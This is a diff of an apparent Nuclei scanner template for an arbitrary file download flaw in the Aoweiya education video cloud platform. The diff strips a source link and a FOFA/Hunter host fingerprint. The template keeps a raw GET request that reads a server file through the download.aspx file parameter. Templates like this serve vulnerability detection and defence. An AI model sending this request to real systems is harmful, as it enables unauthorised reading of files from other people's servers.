@@ -3,14 +3,8 @@ info:
   name: 奥威亚教育视频云平台download存在任意文件下载漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cb3b2ee7123bf6a9936a60062d715f25
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cb3b2ee7123bf6a9936a60062d715f25
-    fofa: + hunter`web.body="/CSS/NewtonTheme/assets/app.css"`
 http:
 - raw:
   - 'GET /download.aspx?file=/Tools/AS/ASRoute.aspx HTTP/1.1
